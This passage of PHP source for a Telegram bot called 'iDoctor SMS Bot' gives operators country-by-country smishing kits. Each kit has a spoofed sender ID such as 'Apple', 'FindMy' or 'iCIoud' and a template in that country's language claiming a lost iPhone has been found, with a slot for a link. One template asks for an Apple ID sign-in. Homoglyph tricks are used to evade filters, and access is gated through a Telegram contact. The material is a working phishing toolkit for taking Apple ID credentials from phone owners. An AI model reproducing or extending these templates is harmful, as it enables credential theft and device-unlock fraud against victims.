Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
        
//Ireland         
if(count(explode("/ireland", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇮🇪 Ireland: +353
--------------------                  
API: 
Sender ID:  FindMy , FMI
Templates:

Dear Customer, 
Your Phone XS Max was found. 
View location at 
https://

FindMy Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Poland         
if(count(explode("/poland", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇵🇱 Poland: +48
--------------------               
API: 
Sender ID: Apple , iCloud , FindMy 
Templates: 

Szanowny Kliencie,
Twoj iPhone 12 Pro 128 GB srebrny zostal znaleziony.
Zobacz lokalizacje:
https://

Wsparcie FindMy.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
        
//Russia         
if(count(explode("/russia", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇷🇺 Russia: +7
-------------------- 
API: 
Sender ID: Apple
Templates: English

Dear Customer,
Your iPhone 13 Pro 128GB
Graphite has been found. View
location: https://

Apple Support.
--------------------

Templates: Russia

Ваш пропавший iPhone активен! 
Для просмотра местоположения войдите с Apple ID: 
https://

Apple Support
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Portugal         
if(count(explode("/portugal", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇵🇹 Portugal : +351
--------------------                
API: 
Sender ID: Find My , FMI
Templates: 

Caro Cliente, 

Seu Phone 12 Pro Max perdido foi encontrado e conectado a internet. 
Para ver sua localizao atual: https://

Suporte da FindMy.
--------------------  
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Thailand         
if(count(explode("/thailand", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇹🇭 Thailand: +66
--------------------               
API: 
Sender ID: Apple , FindMy , FMI
Templates: English

Dear Customer,

Your iPhone 13 Pro Max 128GB Sierra Blue has been located today. 
Check location at:
https://

FindMy Support.
--------------------
API: 
Sender ID: APPLE
Templates: thailand 🇹🇭 


พบ iPhone 13 Pro ที่สูญหายของคุณถูกเชื่อมต่ออินเตอร์เนต ตรวจสอบตำแหน่ง [LINK]

ฝ่ายสนับสนุนแอปเปิ้ล
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
        
//Burkina Faso         
if(count(explode("/burkina_faso", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇧🇫 Burkina Faso: +226
--------------------                 
API: 
Sender ID: FMI , FindMy  
Templates:

Dear Customer, 
Your Phone XS Max was found. 
View location at 
https://

FindMy Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Hong Kong         
if(count(explode("/hong_kong", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇭🇰 Hong Kong: +852
-------------------- 
API: 
Sender ID: Apple
Templates:

Dear Customer, 
Your iPhone XS Max was found. 
View location at 
https://

FindMy Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
//Nigeria         
if(count(explode("/nigeria", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇳🇬 Nigeria: +234
--------------------                 
API: 
Sender ID: FMI   
Templates:

Dear Customer, 
Your iDevice XS Max was found. 
View location at 
https://

FindMy Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Turkey         
if(count(explode("/turkey", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇹🇷 Turkey: +90
--------------------                 
API: 
Sender ID: info   Long code
Templates: 

Kayip iPhone 11 Black Bugun Saat 20:33 Pm Bulundu Konuma git: 
Https:// 

FindMy Destek .
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Australia         
if(count(explode("/australia", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇦🇺 Australia: +61
--------------------               
API:  
Sender ID: FindMy , FMI , INFO
Templates:

Dear Customer, 
Your iDevice XS Max was found. 
View location at 
https://

FindMy Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Azerbaijan         
if(count(explode("/azerbaijan", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇦🇿 Azerbaijan: +994
--------------------                 
API: 
Sender ID: FMI , FindMy  
Templates:

Dear Customer, 
Your Phone XS Max was found. 
View location at 
https://

FindMy Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Philippines         
if(count(explode("/philippines", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇵🇭 Philippines: +63
-------------------- 
API: 
Sender ID: FMI 
Templates: 

Dear Customer,

Your iDevice 14 128GB Starlight was found.
View location at
https://

FMl Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Colombia         
if(count(explode("/colombia", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇨🇴 Colombia : +57
--------------------
API: 
Sender ID:  info
Templates:

Seu dispositivo 11 Pro Max 64GB Silver emitiu uma nova localizacao. acesse:

https://
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Korea         
if(count(explode("/korea", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇰🇷 Korea : +82
--------------------               
API: 
Sender ID: FMI , INFO
Templates:

내 아이폰을 찾기 아이폰 X 위치에 TIME 오늘 발견: https://

 AppIe 지원하다
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//latvia         
if(count(explode("/latvia", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇱🇻 latvia : +371
--------------------                 
API: 
Sender ID: Apple 
Templates:

Dear Customer, 
Your iPhone XS Max was found. 
View location at 
https://

Apple Support
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Croatia         
if(count(explode("/croatia", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇭🇷 Croatia : +385
--------------------                 
API: 
Sender ID: Apple 
Templates:

Dear Customer, 
Your iPhone XS Max was found. 
View location at 
https://

FindMy Support
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
        
//Israel         
if(count(explode("/israel", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇮🇱 Israel : +972
--------------------                 
API: 
Sender ID: Apple , FMI , Find My 
Templates:

Alert!

Your iDevice has been found and connected to the internet.
To view its current location: https://

Best Regards,
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
  
//Slovenia         
if(count(explode("/slovenia", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇸🇮 Slovenia : +386
--------------------                 
API: 
Sender ID: FindMy , FMI 
Templates:

Dear Customer, 
Your iDevice XS Max was found. 
View location at 
https://

FindMy Support
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Luxembourg         
if(count(explode("/luxembourg", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇱🇺 Luxembourg: +352
--------------------                
API: 
Sender ID: Apple
Templates:

Ihr verlorenes iPhone X 256Go wurde heute gefunden.
Standort prufen auf: 
https://

Apple Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Serbia         
if(count(explode("/serbia", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇷🇸 Serbia: +381
--------------------                
API: 
Sender ID: Apple
Templates: Serbian

Драги купац,
Ваш иПһоне је пронађен.
Погледајте локацију на
һттпс://

Аппле подршка
--------------------
API: 
Sender ID: Apple
Templates: English

Dear customer,
Your iPhone has been found.
See the location at
https://

Apple support
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//puerto rico         
if(count(explode("/puerto_rico", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇵🇷 puerto rico : +1
--------------------                 
API: 
Sender ID: Apple 
Templates:

Dear Customer, 
Your iPhone XS Max was found. 
View location at 
https://

Apple Support
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//fiji         
if(count(explode("/fiji", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇫🇯 fiji : +679
--------------------                 
API: 
Sender ID: Apple 
Templates:

Dear Customer, 
Your iPhone XS Max was found. 
View location at 
https://

Apple Support
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Argentina         
if(count(explode("/argentina", $text)) > 1){
$ukshow= "iDoctor SmS Bot Advice 🤖
-------------------- 
🇦🇷 Argentina : +54
--------------------            
                           
API: 
Sender ID:  FMI , FindMy
Templates: TEXT  

Find My:
Seu Dispositivo 13 Pro Max ha sido encendido y localizado hoy a las 20:35. Ver ubicacion en: 

https://

-------------------- 
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        

//iceland         
if(count(explode("/iceland", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇮🇸 iceland: +354
--------------------                 
API: 
Sender ID: FMI , FindMy
Templates: no Apple in text

Dear Customer, 
Your Phone XS Max was found. 
View location at 
Https://

FindMy Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
        
//Peru         
if(count(explode("/peru", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇵🇪 Peru: +51
--------------------                 
API: 
Sender ID: FindMy , FMI
Templates:

Dear Customer,

Your Device 14 128GB Starlight was found.
View location at
https://

FindMy Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
        
//Chile         
if(count(explode("/chile", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇨🇱 Chile: +56
--------------------                 
API: 
Sender ID: Apple , iCloud , FMI
Templates:

Dear Customer,

Your iPhone 14 128GB Starlight was found.
View location at
https://

FindMy Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
        
//Greece         
if(count(explode("/greece", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇬🇷 Greece: +30
--------------------                 
API: 
Sender ID: Apple , iCloud , FMI
Templates:

Dear Customer,

Your iPhone 14 128GB Starlight was found.
View location at
https://

FindMy Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Slovakia         
if(count(explode("/slovakia", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇸🇰 Slovakia: +421
--------------------                 
API: 
Sender ID: Apple , iCloud , FMI
Templates:

Dear Customer,

Your iPhone 14 128GB Starlight was found.
View location at
https://

FindMy Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
//Lithuania         
if(count(explode("/lithuania", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇱🇹 Lithuania: +370
--------------------                 
API: 
Sender ID: Apple , FindMy , iCIoud (i Cpital)
Templates:

Dear Customer,

Your iPhone 14 128GB Starlight was found.
View location at
https://

FindMy Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Montenegro         
if(count(explode("/montenegro", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇲🇪 Montenegro: +382
--------------------                 
API:  
Sender ID: FMI
Templates:

Dear Customer,

Your Phone 14 128GB Starlight was found.
View location at
https://

FindMy Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Gambia         
if(count(explode("/gambia", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇬🇲 Gambia : +220
--------------------                 
API: 
Sender ID: Find My , FMI 
Templates:  

Dear Customer,

Your iDevice 13 128GB Starlight has been found. View location: 
https://

FMI Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Singapore         
if(count(explode("/singapore", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇸🇬 Singapore : +65
--------------------                 
API: 
Sender ID: FindMy , FMI
Templates:  

Dear Customer,

Your iPhone 13 128GB Starlight has been found. View location: 
https://

FMI Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Hungary         
if(count(explode("/hungary", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇭🇺 Hungary : +36
--------------------                 
API:  
Sender ID: FindMy , FMI
Templates:  

Dear Customer,

Your iPhone 13 128GB Starlight has been found. View location: 
https://

FMI Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Mauritania         
if(count(explode("/mauritania", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇲🇷 Mauritania : +222
--------------------                 
API: 
Sender ID: FindMy , FMI
Templates:  

Alert!

Your Device has been found and connected to the internet.
To view its current location: https://

Best Regards,
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Ghana         
if(count(explode("/ghana", $text)) > 1){
$ukshow= "DoctorSmS Bot Advice 🤖
-------------------- 
🇬🇭 Ghana: +233
--------------------            
                           
API: 
Sender ID: FindMy , FMI  All network
Templates: TEXT 

Dear Customer,

Your iDevice 13 128GB Starlight has been found. View location: 
https://

FindMy Support.
--------------------   
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Albania         
if(count(explode("/albania", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇦🇱 Albania : +355
--------------------                 
API: 
Sender ID: FindMy , FMI
Templates:  

Alert!

Your Device has been found and connected to the internet.
To view its current location: https://

Best Regards,
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
else if((count(explode("/Admin", $text)) > 1)&&($chat_id=="140886799")){
 $AppleID = explode("/Admin ",$text)[1];   

bot("sendmessage",array('chat_id' => $chat_id, 'text' => $apiTOK));
}
}
else  
{
$resp = "You Are Not Accepted ?>>? Please contact @Zikooo2002 to activate this Bot"  ;
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $resp));
die();
}
}